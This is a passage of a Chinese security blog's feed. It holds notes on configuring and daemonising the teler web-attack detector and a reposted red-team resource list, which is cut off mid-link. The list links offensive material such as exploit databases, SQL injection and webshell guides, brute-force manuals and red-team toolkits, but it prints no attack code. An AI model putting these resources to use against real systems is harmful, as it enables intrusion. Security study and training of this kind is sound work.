alt="image-20210311093400339"></p><p>当我在nginx logfomat中加了一个无用的结尾字符 - </p><div class="hljs code-wrapper"><pre><code class="hljs nginx"><span class="hljs-attribute">log_format</span>  main  <span class="hljs-string">&#x27;$remote_addr $remote_user - [$time_iso8601] &quot;$request&quot; &#x27;</span>                  <span class="hljs-string">&#x27;$status $body_bytes_sent &quot;$http_referer&quot; &#x27;</span>                  <span class="hljs-string">&#x27;&quot;$http_user_agent&quot; &quot;$request_body&quot; -&#x27;</span>;</code></pre></div><p>然后再在teler.yaml 中加入一个无用的变量</p><div class="hljs code-wrapper"><pre><code class="hljs yaml"><span class="hljs-attr">log_format:</span> <span class="hljs-string">|</span>  <span class="hljs-string">$remote_addr</span> <span class="hljs-string">$remote_user</span> <span class="hljs-bullet">-</span> [<span class="hljs-string">$time_local</span>] <span class="hljs-string">&quot;$request_method $request_uri $request_protocol&quot;</span>   <span class="hljs-string">$status</span> <span class="hljs-string">$body_bytes_sent</span> <span class="hljs-string">&quot;$http_referer&quot;</span> <span class="hljs-string">&quot;$http_user_agent&quot;</span> <span class="hljs-string">&quot;$request_body&quot;</span> <span class="hljs-string">$x</span></code></pre></div><p>它就能解析并打印出结果了</p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210311093720964.png" alt="image-20210311093720964"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;teler-坑一：日志格式解析坑&quot;&gt;&lt;a href=&quot;#teler-坑一：日志格式解析坑&quot; class=&quot;headerlink&quot; title=&quot;teler 坑一：日志格式解析坑&quot;&gt;&lt;/a&gt;teler 坑一：日志格式解析坑&lt;/h1&gt;&lt;p&gt;我尝试使用如下的日志格式，加</summary>
      
    
    
    
    <category term="安全工具" scheme="https://greydr34d.github.io/categories/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/"/>
    
    <category term="teler" scheme="https://greydr34d.github.io/categories/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/teler/"/>
    
    
    <category term="teler" scheme="https://greydr34d.github.io/tags/teler/"/>
    
    <category term="安全工具" scheme="https://greydr34d.github.io/tags/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/"/>
    
  </entry>
  
  <entry>
    <title>teler守护进程化思路</title>
    <link href="https://greydr34d.github.io/2021/03/13/teler%E5%AE%88%E6%8A%A4%E8%BF%9B%E7%A8%8B%E5%8C%96%E6%80%9D%E8%B7%AF/"/>
    <id>https://greydr34d.github.io/2021/03/13/teler%E5%AE%88%E6%8A%A4%E8%BF%9B%E7%A8%8B%E5%8C%96%E6%80%9D%E8%B7%AF/</id>
    <published>2021-03-13T08:36:06.000Z</published>
    <updated>2021-03-13T08:39:58.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="teler守护进程化思路"><a href="#teler守护进程化思路" class="headerlink" title="teler守护进程化思路"></a>teler守护进程化思路</h1><h2 id="思路一：利用disown"><a href="#思路一：利用disown" class="headerlink" title="思路一：利用disown"></a>思路一：利用disown</h2><p>teler如果能够成为后台守护进程就好了，经过尝试，可以使用 disown实现。</p><p>需要将对终端的输出屏蔽掉。</p><div class="hljs code-wrapper"><pre><code class="hljs sh">tail -f /var/<span class="hljs-built_in">log</span>/nginx/access.log | teler -c teler.yaml  -o ./result.json --json &gt; /dev/null 2&gt;&amp;1  &amp;<span class="hljs-built_in">disown</span></code></pre></div><p>nohup应该也可以实现，但是不知道为什么没有效果。</p><p>可以使用jobs查看当前终端下的任务：</p><div class="hljs code-wrapper"><pre><code class="hljs sh"><span class="hljs-built_in">jobs</span></code></pre></div><p>执行完上面两条再执行jobs就看不到任务了。</p><p>在使用ps aux查看。可以看到teler进程</p><div class="hljs code-wrapper"><pre><code class="hljs sh">ps aux</code></pre></div><h2 id="思路二：利用docker后台运行功能"><a href="#思路二：利用docker后台运行功能" class="headerlink" title="思路二：利用docker后台运行功能"></a>思路二：利用docker后台运行功能</h2><p>docker-compose 中-d参数可以使容器在后台运行，恰好满足要求。下面是我编写的docker-compose.yml以及Dockerfile</p><div class="hljs code-wrapper"><pre><code class="hljs yml"><span class="hljs-attr">version:</span> <span class="hljs-string">&#x27;2.3&#x27;</span><span class="hljs-attr">services:</span>   <span class="hljs-attr">teler:</span>    <span class="hljs-attr">container_name:</span> <span class="hljs-string">teler_analysis</span>    <span class="hljs-attr">build:</span>      <span class="hljs-attr">context:</span> <span class="hljs-string">.</span>    <span class="hljs-attr">volumes:</span>       <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;./teler.yaml:/teler.yaml&quot;</span>      <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;./access.log:/access.log&quot;</span>      <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;./teler-resources/:/.cache/teler-resources/&quot;</span>      <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;./start.sh:/start.sh&quot;</span>      <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;./result.json:/result.json&quot;</span>    <span class="hljs-attr">entrypoint:</span> <span class="hljs-string">/bin/sh</span>    <span class="hljs-attr">command:</span> <span class="hljs-string">/start.sh</span>    <span class="hljs-attr">tty:</span> <span class="hljs-literal">true</span></code></pre></div><ul><li>将配置文件、日志文件、teler缓存文件、输出结果文件以镜像的方式放入</li><li>start.sh写入我们要执行的命令</li></ul><div class="hljs code-wrapper"><pre><code class="hljs sh"><span class="hljs-meta">#!/bin/sh</span>tail -f /access.log | teler -c /teler.yaml --json -o result.json</code></pre></div><p>运行：</p><div class="hljs code-wrapper"><pre><code class="hljs sh">docker-compose up --build -d</code></pre></div><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210310084716707.png" alt="image-20210310084716707"></p><p>result.json中随即产生输出</p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210310084742467.png" alt="image-20210310084742467"></p><p>进入</p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210310084817175.png" alt="image-20210310084817175"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;teler守护进程化思路&quot;&gt;&lt;a href=&quot;#teler守护进程化思路&quot; class=&quot;headerlink&quot; title=&quot;teler守护进程化思路&quot;&gt;&lt;/a&gt;teler守护进程化思路&lt;/h1&gt;&lt;h2 id=&quot;思路一：利用disown&quot;&gt;&lt;a href=&quot;#思</summary>
      
    
    
    
    <category term="安全工具" scheme="https://greydr34d.github.io/categories/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/"/>
    
    <category term="teler" scheme="https://greydr34d.github.io/categories/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/teler/"/>
    
    
    <category term="teler" scheme="https://greydr34d.github.io/tags/teler/"/>
    
    <category term="安全工具" scheme="https://greydr34d.github.io/tags/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/"/>
    
  </entry>
  
  <entry>
    <title>linux 学习资料汇总</title>
    <link href="https://greydr34d.github.io/2021/03/13/linux-%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99%E6%B1%87%E6%80%BB/"/>
    <id>https://greydr34d.github.io/2021/03/13/linux-%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99%E6%B1%87%E6%80%BB/</id>
    <published>2021-03-13T02:46:16.000Z</published>
    <updated>2021-03-13T02:50:54.000Z</updated>
    
    <content type="html"><![CDATA[<p>汇总平时遇到的linux问题与解决参考文献</p><ul><li><a href="http://www.ruanyifeng.com/blog/2016/02/linux-daemon.html">Linux 守护进程的启动方法</a></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;汇总平时遇到的linux问题与解决参考文献&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;http://www.ruanyifeng.com/blog/2016/02/linux-daemon.html&quot;&gt;Linux 守护进程的启动方法&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</summary>
      
    
    
    
    <category term="资料收集" scheme="https://greydr34d.github.io/categories/%E8%B5%84%E6%96%99%E6%94%B6%E9%9B%86/"/>
    
    <category term="linux" scheme="https://greydr34d.github.io/categories/%E8%B5%84%E6%96%99%E6%94%B6%E9%9B%86/linux/"/>
    
    
    <category term="linux" scheme="https://greydr34d.github.io/tags/linux/"/>
    
    <category term="后台守护进程" scheme="https://greydr34d.github.io/tags/%E5%90%8E%E5%8F%B0%E5%AE%88%E6%8A%A4%E8%BF%9B%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>【转载】红队技战法</title>
    <link href="https://greydr34d.github.io/2021/03/09/%E3%80%90%E8%BD%AC%E8%BD%BD%E3%80%91%E7%BA%A2%E9%98%9F%E6%8A%80%E6%88%98%E6%B3%95/"/>
    <id>https://greydr34d.github.io/2021/03/09/%E3%80%90%E8%BD%AC%E8%BD%BD%E3%80%91%E7%BA%A2%E9%98%9F%E6%8A%80%E6%88%98%E6%B3%95/</id>
    <published>2021-03-09T02:26:29.000Z</published>
    <updated>2021-03-13T02:55:30.000Z</updated>
    
    <content type="html"><![CDATA[<p>转载于：<a href="https://www.lshack.cn/772/">https://www.lshack.cn/772/</a></p><h1 id="项目简介"><a href="#项目简介" class="headerlink" title="项目简介#"></a><strong>项目简介</strong>#</h1><p>一个 Red Team 攻击的生命周期，整个生命周期包括：<br>信息收集、攻击尝试获得权限、持久性控制、权限提升、网络信息收集、横向移动、数据分析（在这个基础上再做持久化控制）、在所有攻击结束之后清理并退出战场。</p><h2 id="相关资源列表"><a href="#相关资源列表" class="headerlink" title="相关资源列表#"></a><strong>相关资源列表</strong>#</h2><ul><li><p><a href="https://mitre-attack.github.io/">https://mitre-attack.github.io/</a> mitre 科技机构对攻击技术的总结 wiki</p></li><li><p><a href="https://huntingday.github.io/">https://huntingday.github.io</a> MITRE | ATT&amp;CK 中文站</p></li><li><p><a href="https://arxiv.org/">https://arxiv.org</a> 康奈尔大学（Cornell University）开放文档</p></li><li><p><a href="http://www.owasp.org.cn/owasp-project/owasp-things">http://www.owasp.org.cn/owasp-project/owasp-things</a> OWASP 项目</p></li><li><p><a href="http://www.irongeek.com/i.php?page=security/hackingillustrated">http://www.irongeek.com/i.php?page=security/hackingillustrated</a> 国内外安全大会相关视频与文档</p></li><li><p><a href="https://github.com/knownsec/KCon">https://github.com/knownsec/KCon</a> KCon 大会文章 PPT</p></li><li><p><a href="https://github.com/SecWiki/sec-chart">https://github.com/SecWiki/sec-chart</a> 各种相关安全思维导图集合</p></li><li><p><a href="https://github.com/knownsec/RD_Checklist">https://github.com/knownsec/RD_Checklist</a> 知道创宇技能列表</p></li><li><p><a href="https://github.com/ChrisLinn/greyhame-2017">https://github.com/ChrisLinn/greyhame-2017</a> 灰袍技能书 2017 版本</p></li><li><p><a href="https://github.com/Hack-with-Github/Awesome-Hacking">https://github.com/Hack-with-Github/Awesome-Hacking</a> GitHub 万星推荐：黑客成长技术清单</p></li><li><p><a href="https://github.com/k4m4/movies-for-hackers">https://github.com/k4m4/movies-for-hackers</a> 安全相关电影</p></li><li><p><a href="https://github.com/jaredthecoder/awesome-vehicle-security">https://github.com/jaredthecoder/awesome-vehicle-security</a> 一个用于了解车辆安全和汽车黑客的资源清单</p></li><li><p><a href="https://www.jianshu.com/p/852e0fbe2f4c">https://www.jianshu.com/p/852e0fbe2f4c</a> 安全产品厂商分类</p></li><li><p><a href="https://www.reddit.com/r/Python/comments/a81mg3/the_entire_mit_intro_computer_science_class_using/">https://www.reddit.com/r/Python/comments/a81mg3/the_entire_mit_intro_computer_science_class_using/</a> 麻省理工机器学习视频</p></li><li><p><a href="https://github.com/fxsjy/jieba">https://github.com/fxsjy/jieba</a> py，结巴中文分词</p></li><li><p><a href="https://github.com/thunlp/THULAC-Python">https://github.com/thunlp/THULAC-Python</a> py，清华中文分词</p></li><li><p><a href="https://github.com/lancopku/PKUSeg-python">https://github.com/lancopku/PKUSeg-python</a> py3，北大中文分词</p></li><li><p><a href="https://github.com/fengdu78/Coursera-ML-AndrewNg-Notes">https://github.com/fengdu78/Coursera-ML-AndrewNg-Notes</a> 吴恩达机器学习 python 笔记</p></li><li><p><a href="https://paperswithcode.com/sota">https://paperswithcode.com/sota</a> 机器学习具体项目、演示、代码</p></li><li><p><a href="https://github.com/duoergun0729/nlp">https://github.com/duoergun0729/nlp</a> 一本开源的 NLP（神经语言程序学）入门书籍</p></li><li><p><a href="https://www.freebuf.com/articles/web/195304.html">https://www.freebuf.com/articles/web/195304.html</a> 一句话木马的套路</p></li></ul><h2 id="攻防测试手册"><a href="#攻防测试手册" class="headerlink" title="攻防测试手册#"></a><strong>攻防测试手册</strong>#</h2><ul><li><p><a href="https://micropoor.blogspot.com/2019/01/php8.html">https://micropoor.blogspot.com/2019/01/php8.html</a> PHP 安全新闻早 8 点课程系列高持续渗透–Microporor</p></li><li><p><a href="https://github.com/Micropoor/Micro8">https://github.com/Micropoor/Micro8</a> Microporor 高级攻防 100 课</p></li><li><p><a href="https://github.com/maskhed/Papers">https://github.com/maskhed/Papers</a> 包含 100 课等经典攻防教材、安全知识</p></li><li><p><a href="https://github.com/infosecn1nja/AD-Attack-Defense">https://github.com/infosecn1nja/AD-Attack-Defense</a> 红蓝方攻防手册</p></li><li><p><a href="https://github.com/yeyintminthuhtut/Awesome-Red-Teaming">https://github.com/yeyintminthuhtut/Awesome-Red-Teaming</a> 优秀红队资源列表</p></li><li><p><a href="https://github.com/foobarto/redteam-notebook">https://github.com/foobarto/redteam-notebook</a> 红队标准渗透测试流程+常用命令</p></li><li><p><a href="https://github.com/tom0li/collection-document">https://github.com/tom0li/collection-document</a> 文章收集：安全部、SDL、src、渗透测试、漏洞利用</p></li><li><p><a href="https://github.com/kbandla/APTnotes">https://github.com/kbandla/APTnotes</a> 各种公开的文件和相关的 APT 笔记，还有软件样本</p></li><li><p><a href="https://wizardforcel.gitbooks.io/web-hacking-101/content">https://wizardforcel.gitbooks.io/web-hacking-101/content</a> Web Hacking 101 中文版</p></li><li><p><a href="https://techvomit.net/web-application-penetration-testing-notes/">https://techvomit.net/web-application-penetration-testing-notes/</a> web 渗透测试笔记</p></li><li><p><a href="https://github.com/qazbnm456/awesome-web-security">https://github.com/qazbnm456/awesome-web-security</a> Web 安全资料和资源列表</p></li><li><p><a href="http://pentestmonkey.net/category/cheat-sheet">http://pentestmonkey.net/category/cheat-sheet</a> 渗透测试常见条目</p></li><li><p><a href="https://github.com/demonsec666/Security-Toolkit">https://github.com/demonsec666/Security-Toolkit</a> 渗透攻击链中常用工具及使用场景</p></li><li><p><a href="https://github.com/Kinimiwar/Penetration-Testing">https://github.com/Kinimiwar/Penetration-Testing</a> 渗透测试方向优秀资源收集</p></li><li><p><a href="https://github.com/jshaw87/Cheatsheets">https://github.com/jshaw87/Cheatsheets</a> 渗透测试/安全秘籍/笔记</p></li></ul><h2 id="内网安全文档"><a href="#内网安全文档" class="headerlink" title="内网安全文档#"></a><strong>内网安全文档</strong>#</h2><ul><li><p><a href="https://attack.mitre.org/wiki/Lateral_Movement">https://attack.mitre.org/wiki/Lateral_Movement</a> mitre 机构对横向移动的总结</p></li><li><p><a href="https://payloads.online/archivers/2018-11-30/1">https://payloads.online/archivers/2018-11-30/1</a> 彻底理解 Windows 认证 - 议题解读</p></li><li><p><a href="https://github.com/klionsec/klionsec.github.io">https://github.com/klionsec/klionsec.github.io</a> 内网大牛的学习历程</p></li><li><p><a href="https://github.com/l3m0n/pentest_study">https://github.com/l3m0n/pentest_study</a> 从零开始内网渗透学习</p></li><li><p><a href="https://github.com/Ridter/Intranet_Penetration_Tips">https://github.com/Ridter/Intranet_Penetration_Tips</a> 内网渗透 TIPS</p></li></ul><h2 id="学习手册相关资源"><a href="#学习手册相关资源" class="headerlink" title="学习手册相关资源#"></a><strong>学习手册相关资源</strong>#</h2><ul><li><p><a href="https://github.com/HarmJ0y/CheatSheets">https://github.com/HarmJ0y/CheatSheets</a> 多个项目的速查手册（Beacon / Cobalt Strike，PowerView，PowerUp，Empire 和 PowerSploit）</p></li><li><p><a href="https://wizardforcel.gitbooks.io/kali-linux-web-pentest-cookbook/content/">https://wizardforcel.gitbooks.io/kali-linux-web-pentest-cookbook/content/</a> Kali Linux Web 渗透测试秘籍 中文版</p></li><li><p><a href="https://github.com/louchaooo/kali-tools-zh">https://github.com/louchaooo/kali-tools-zh</a> kali 下工具使用介绍手册</p></li><li><p><a href="https://www.offensive-security.com/metasploit-unleashed/">https://www.offensive-security.com/metasploit-unleashed/</a> kali 出的 metasploit 指导笔记</p></li><li><p><a href="http://www.hackingarticles.in/comprehensive-guide-on-hydra-a-brute-forcing-tool/">http://www.hackingarticles.in/comprehensive-guide-on-hydra-a-brute-forcing-tool/</a> hydra 使用手册</p></li><li><p><a href="https://www.gitbook.com/book/t0data/burpsuite/details">https://www.gitbook.com/book/t0data/burpsuite/details</a> burpsuite 实战指南</p></li><li><p><a href="https://zhuanlan.zhihu.com/p/26618074">https://zhuanlan.zhihu.com/p/26618074</a> Nmap 扩展脚本使用方法</p></li><li><p><a href="https://somdev.me/21-things-xss/">https://somdev.me/21-things-xss/</a> XSS 的 21 个扩展用途</p></li><li><p><a href="https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/">https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/</a> sql 注入 sheet 表</p></li><li><p><a href="https://sqlwiki.netspi.com/">https://sqlwiki.netspi.com/</a> 你要的 sql 注入知识点都能找到</p></li><li><p><a href="https://github.com/kevins1022/SQLInjectionWiki">https://github.com/kevins1022/SQLInjectionWiki</a> 一个专注于聚合和记录各种 SQL 注入方法的 wiki</p></li><li><p><a href="https://github.com/hardenedlinux/linux-exploit-development-tutorial">https://github.com/hardenedlinux/linux-exploit-development-tutorial</a> Linux exploit 开发入门</p></li><li><p><a href="https://wizardforcel.gitbooks.io/asani/content">https://wizardforcel.gitbooks.io/asani/content</a> 浅入浅出 Android 安全 中文版</p></li><li><p><a href="https://wizardforcel.gitbooks.io/lpad/content">https://wizardforcel.gitbooks.io/lpad/content</a> Android 渗透测试学习手册 中文版</p></li><li><p><a href="https://github.com/writeups/ios">https://github.com/writeups/ios</a> ios 漏洞 writeup 笔记</p></li><li><p><a href="http://blog.safebuff.com/2016/07/03/SSRF-Tips/">http://blog.safebuff.com/2016/07/03/SSRF-Tips/</a> ssrf 漏洞利用手册</p></li></ul><h2 id="Checklist-和基础安全知识"><a href="#Checklist-和基础安全知识" class="headerlink" title="Checklist 和基础安全知识#"></a><strong>Checklist 和基础安全知识</strong>#</h2><ul><li><p><a href="https://book.yunzhan365.com/umta/rtnp/mobile/index.html">https://book.yunzhan365.com/umta/rtnp/mobile/index.html</a> 网络安全科普小册子</p></li><li><p><a href="http://sec.cuc.edu.cn/huangwei/textbook/ns/">http://sec.cuc.edu.cn/huangwei/textbook/ns/</a> 网络安全电子版教材。中传信安课程网站</p></li><li><p><a href="https://mitre.github.io/attack-navigator/enterprise/">https://mitre.github.io/attack-navigator/enterprise/</a> mitre 机构 att&amp;ck 入侵检测条目</p></li><li><p><a href="https://github.com/danielmiessler/SecLists">https://github.com/danielmiessler/SecLists</a> 表类型包括用户名，密码，URL，敏感数据模式，模糊测试负载，Web shell 等</p></li><li><p><a href="https://github.com/GitGuardian/APISecurityBestPractices">https://github.com/GitGuardian/APISecurityBestPractices</a> api 接口测试 checklist</p></li><li><p><a href="https://github.com/ym2011/SecurityManagement">https://github.com/ym2011/SecurityManagement</a> 分享在建设安全管理体系、ISO27001、等级保护、安全评审过程中的点点滴滴</p></li><li><p><a href="https://mp.weixin.qq.com/s?__biz=MzAxNDY2MTQ2OQ==&mid=2650943453&idx=1&sn=e3dc98585ae9e7e39aeafc029dca4c7a&scene=21#wechat_redirect">https://mp.weixin.qq.com/s/O36e0gl4cs0ErQPsb5L68Q</a> 区块链，以太坊智能合约审计 CheckList</p></li><li><p><a href="https://github.com/slowmist/eos-bp-nodes-security-checklist">https://github.com/slowmist/eos-bp-nodes-security-checklist</a> 区块链，EOS bp nodes security checklist（EOS 超级节点安全执行指南）</p></li><li><p><a href="https://xz.aliyun.com/t/2089">https://xz.aliyun.com/t/2089</a> 金融科技 SDL 安全设计 checklist</p></li><li><p><a href="https://github.com/juliocesarfort/public-pentesting-reports">https://github.com/juliocesarfort/public-pentesting-reports</a> 由几家咨询公司和学术安全组织发布的公共渗透测试报告的列表。</p></li><li><p><a href="http://www.freebuf.com/articles/network/169632.html">http://www.freebuf.com/articles/network/169632.html</a> 开源软件创建 SOC 的一份清单</p></li><li><p><a href="https://github.com/0xRadi/OWASP-Web-Checklist">https://github.com/0xRadi/OWASP-Web-Checklist</a> owasp 网站检查条目</p></li><li><p><a href="https://www.securitypaper.org/">https://www.securitypaper.org/</a> SDL 开发安全生命周期管理</p></li><li><p><a href="https://github.com/Jsitech/JShielder">https://github.com/Jsitech/JShielder</a> linux 下服务器一键加固脚本</p></li><li><p><a href="https://github.com/wstart/DB_BaseLine">https://github.com/wstart/DB_BaseLine</a> 数据库基线检查工具</p></li></ul><h2 id="产品设计文档"><a href="#产品设计文档" class="headerlink" title="产品设计文档#"></a><strong>产品设计文档</strong>#</h2><ul><li><p><a href="https://www.freebuf.com/sectool/135032.html">https://www.freebuf.com/sectool/135032.html</a> 构建一个高交互型的难以发现的蜜罐</p></li><li><p><a href="https://bloodzer0.github.io/ossa/">https://bloodzer0.github.io/ossa/</a> 利用开源文件进行开源安全架构.主机、扫描器、端口、日志、防护设备等</p></li><li><p><a href="https://github.com/dvf/blockchain">https://github.com/dvf/blockchain</a> 用 Python 从零开始创建区块链</p></li><li><p><a href="https://github.com/crazywa1ker/DarthSidious-Chinese">https://github.com/crazywa1ker/DarthSidious-Chinese</a> 从 0 开始你的域渗透之旅，DarthSidious 中文版</p></li><li><p><a href="https://paper.seebug.org/772/">https://paper.seebug.org/772/</a> 如何使用 KittyFuzzer 结合 ISF 中的工控协议组件对工控协议进行 Fuzz</p></li></ul><h2 id="学习靶场"><a href="#学习靶场" class="headerlink" title="学习靶场#"></a><strong>学习靶场</strong>#</h2><ul><li><p><a href="https://www.blackmoreops.com/2018/11/06/124-legal-hacking-websites-to-practice-and-learn/">https://www.blackmoreops.com/2018/11/06/124-legal-hacking-websites-to-practice-and-learn/</a> 124 个合法的可以练习 Hacking 技术的网站</p></li><li><p><a href="https://www.zhihu.com/question/267204109">https://www.zhihu.com/question/267204109</a> 学 web 安全去哪里找各种各样的靶场？</p></li><li><p><a href="https://www.vulnhub.com/">https://www.vulnhub.com</a> 许多 ctf 靶机汇总</p></li><li><p><a href="https://www.wechall.net/">https://www.wechall.net</a> 世界知名 ctf 汇总交流网站</p></li><li><p><a href="https://www.xssgame.com/">https://www.xssgame.com</a> 谷歌 XSS 挑战</p></li><li><p><a href="http://xss.tv/">http://xss.tv</a> 在线靶场挑战</p></li><li><p><a href="https://www.hackthebox.eu/">https://www.hackthebox.eu</a> 在线靶场挑战</p></li><li><p><a href="https://www.root-me.org/">https://www.root-me.org</a> 在线靶场挑战</p></li><li><p><a href="http://www.itsecgames.com/">http://www.itsecgames.com</a> bWAPP，包含 100 多种漏洞环境</p></li><li><p><a href="https://github.com/c0ny1/vulstudy">https://github.com/c0ny1/vulstudy</a> 多种漏洞复现系统的 docker 汇总</p></li><li><p><a href="https://github.com/bkimminich/juice-shop">https://github.com/bkimminich/juice-shop</a> 常见 web 安全实验靶场市场</p></li><li><p><a href="https://github.com/ethicalhack3r/DVWA">https://github.com/ethicalhack3r/DVWA</a> web 安全实验靶场</p></li><li><p><a href="https://www.freebuf.com/articles/web/123779.html">https://www.freebuf.com/articles/web/123779.html</a> 新手指南：DVWA-1.9 全级别教程</p></li><li><p><a href="https://github.com/78778443/permeate">https://github.com/78778443/permeate</a> php，常见漏洞靶场</p></li><li><p><a href="https://github.com/gh0stkey/DoraBox">https://github.com/gh0stkey/DoraBox</a> php,常见漏洞靶场</p></li><li><p><a href="https://github.com/stamparm/DSVW">https://github.com/stamparm/DSVW</a> py2,常见漏洞靶场</p></li><li><p><a href="https://github.com/amolnaik4/bodhi">https://github.com/amolnaik4/bodhi</a> py,常见漏洞靶场</p></li><li><p><a href="https://github.com/Safflower/Solve-Me">https://github.com/Safflower/Solve-Me</a> php，韩国一个偏代码审计的 ctf 靶场源码</p></li><li><p><a href="https://github.com/WebGoat/WebGoat">https://github.com/WebGoat/WebGoat</a> 一键 jar 包，web 安全实验靶场</p></li><li><p><a href="https://github.com/Audi-1/sqli-labs">https://github.com/Audi-1/sqli-labs</a> 基于 SQLite 的 sql 注入学习靶场</p></li><li><p><a href="https://github.com/lcamry/sqli-labs">https://github.com/lcamry/sqli-labs</a> 通过 sqli-labs 演示 mysql 相关的注入手法</p></li><li><p><a href="https://github.com/c0ny1/upload-labs">https://github.com/c0ny1/upload-labs</a> 一个帮你总结所有类型的上传漏洞的靶场</p></li><li><p><a href="https://github.com/LandGrey/upload-labs-writeup">https://github.com/LandGrey/upload-labs-writeup</a> upload-labs 指导手册</p></li><li><p><a href="https://github.com/Go0s/LFIboomCTF">https://github.com/Go0s/LFIboomCTF</a> 本地文件包含漏洞&amp;&amp;PHP 利用协议&amp;&amp;实践源码</p></li><li><p><a href="https://in.security/lin-security-practise-your-linux-privilege-escalation-foo/">https://in.security/lin-security-practise-your-linux-privilege-escalation-foo/</a> 一个虚拟机文件用于 linux 提权练习</p></li><li><p><a href="https://github.com/OWASP/igoat">https://github.com/OWASP/igoat</a> 适用于 ios 应用程序测试和安全性的学习工具</p></li><li><p><a href="https://github.com/prateek147/DVIA-v2">https://github.com/prateek147/DVIA-v2</a> 适用于 ios 应用程序测试和安全性的学习工具</p></li><li><p><a href="https://github.com/rapid7/metasploitable3">https://github.com/rapid7/metasploitable3</a> metasploit 练习系统</p></li><li><p><a href="https://github.com/rapid7/metasploit-vulnerability-emulator">https://github.com/rapid7/metasploit-vulnerability-emulator</a> 基于 perl 的 metasploit 模拟环境，练习操作</p></li><li><p><a href="https://github.com/chryzsh/DarthSidious">https://github.com/chryzsh/DarthSidious</a> AD 域环境的搭建、渗透、防护</p></li><li><p><a href="https://github.com/c0ny1/xxe-lab">https://github.com/c0ny1/xxe-lab</a> 一个包含 php,java,python,C#等各种语言版本的 XXE 漏洞 Demo</p></li></ul><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现#"></a><strong>漏洞复现</strong>#</h2><ul><li><p><a href="https://github.com/vulhub/vulhub">https://github.com/vulhub/vulhub</a> Vulhub 是一个面向大众的开源漏洞靶场，无需 docker 知识，执行两条命令即可编译、运行一个完整的漏洞靶场镜像</p></li><li><p><a href="https://github.com/Medicean/VulApps">https://github.com/Medicean/VulApps</a> 收集各种漏洞环境，为方便使用，统一采用 Dockerfile 形式。同时也收集了安全工具环境。</p></li><li><p><a href="https://github.com/bingohuang/docker-labs">https://github.com/bingohuang/docker-labs</a> 制作在线 docker 平台</p></li></ul><h2 id="开源漏洞库"><a href="#开源漏洞库" class="headerlink" title="开源漏洞库#"></a><strong>开源漏洞库</strong>#</h2><ul><li><p><a href="https://wooyun.kieran.top/#!/">https://wooyun.kieran.top/#!/</a> 2016 年之前，乌云 Drops 文章，公开漏洞详情文章</p></li><li><p><a href="https://wooyun.js.org/">https://wooyun.js.org/</a> 2016 年之前，乌云 Drops 文章，公开漏洞详情文章</p></li><li><p><a href="https://dvpnet.io/list/index/state/3">https://dvpnet.io/list/index/state/3</a> 公开漏洞详情文章</p></li><li><p><a href="https://sec.ly.com/bugs">https://sec.ly.com/bugs</a> 同程安全公开漏洞详情文章</p></li><li><p><a href="http://ics.cnvd.org.cn/">http://ics.cnvd.org.cn</a> 中国国家工控漏洞库</p></li><li><p><a href="https://ics-cert.us-cert.gov/advisories">https://ics-cert.us-cert.gov/advisories</a> 美国国家工控漏洞库</p></li><li><p><a href="http://www.nsfocus.net/index.php?act=sec_bug">http://www.nsfocus.net/index.php?act=sec_bug</a> 绿盟漏洞库，含工控</p></li><li><p><a href="http://ivd.winicssec.com/">http://ivd.winicssec.com/</a> 威努特工控漏洞库</p></li><li><p><a href="http://cve.scap.org.cn/view/ics">http://cve.scap.org.cn/view/ics</a> CVE 中文工控漏洞库</p></li><li><p><a href="https://cve.mitre.org/cve/search_cve_list.html">https://cve.mitre.org/cve/search_cve_list.html</a> 美国 MITRE 公司负责维护的 CVE 漏洞库</p></li><li><p><a href="https://www.exploit-db.com/">https://www.exploit-db.com</a> 美国 Offensive Security 的漏洞库</p></li><li><p><a href="https://nvd.nist.gov/vuln/search">https://nvd.nist.gov/vuln/search</a> 美国国家信息安全漏洞库</p></li></ul><h2 id="工具包集合"><a href="#工具包集合" class="headerlink" title="工具包集合#"></a><strong>工具包集合</strong>#</h2><ul><li><p><a href="http://www.4hou.com/web/11241.html">http://www.4hou.com/web/11241.html</a> 史上最全攻击模拟工具盘点</p></li><li><p><a href="https://github.com/infosecn1nja/Red-Teaming-Toolkit">https://github.com/infosecn1nja/Red-Teaming-Toolkit</a> 信息收集、攻击尝试获得权限、持久性控制、权限提升、网络信息收集、横向移动、数据分析（在这个基础上再做持久化控制）、清理痕迹</p></li><li><p><a href="https://github.com/toolswatch/blackhat-arsenal-tools">https://github.com/toolswatch/blackhat-arsenal-tools</a> 黑帽大会工具集</p></li><li><p><a href="https://www.cnblogs.com/k8gege">https://www.cnblogs.com/k8gege</a> K8 哥哥工具包集合。解压密码 Kk8team,Kk8gege</p></li><li><p><a href="https://github.com/n00py/ReadingList/blob/master/gunsafe.txt">https://github.com/n00py/ReadingList/blob/master/gunsafe.txt</a> 安全工具集</p></li><li><p><a href="https://github.com/Ridter/Pentest">https://github.com/Ridter/Pentest</a> 安全工具集</p></li><li><p><a 